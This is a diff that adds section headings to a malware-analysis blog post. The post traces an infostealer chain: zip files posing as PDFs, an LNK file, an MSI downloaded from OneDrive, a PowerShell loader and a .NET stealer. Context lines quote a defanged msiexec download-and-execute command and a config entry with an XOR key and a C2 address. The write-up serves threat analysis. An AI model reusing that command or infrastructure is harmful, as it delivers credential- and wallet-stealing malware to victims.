@@ -2,6 +2,8 @@
 
 I recently came across a site which hosts multiple zip archives masquerading as PDF documents. The aim is to distribute a second-stage PowerShell script which executes a .NET binary in memory. The binary collects system information and targets software such as web browsers, cryptocurrency wallets, two-factor authentication applications and gaming software.
 
+## Initial LNK File
+
 The file is delivered to the victim via email, which prompts them to download and open the following file:
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a0451615-f6eb-40e0-85fd-891396665494)
@@ -15,9 +17,13 @@ C:\Windows\System32\msiexec.exe -package hxxPs[:/\]onedrive.live[.]com/download?
 
 Upon execution, MsiExec would execute with the argument to download and execute a MSI file from the OneDrive URL provided.
 
+## MSI File Analysis 
+
 This downloaded a file called "42WiseAnyConnect.msi", which we can extract a PowerShell script from using lessmsi:
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/76fd615d-1298-47ac-bf25-a9e719da17d3)
+
+## PowerShell Deobfuscation
 
 PowerShell Script:
 ``` powershell
@@ -152,6 +158,8 @@ zpsoJEKDxaCoTLVurobI|ezzcAvVW|hxxp[://]45.129.199[.]204/index.php|
 We know that the first value is the XOR key, so we can use this to retrieve the binary from the byte array using CyberChef.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/50343d38-5655-4491-b786-f72712eb31ee)
+
+## Binary Analysis
 
 The binary can be reviewed in DNSpy as it is a .NET binary, however, it is extremely obfuscated as it has been protected with ConfuserEx.
 
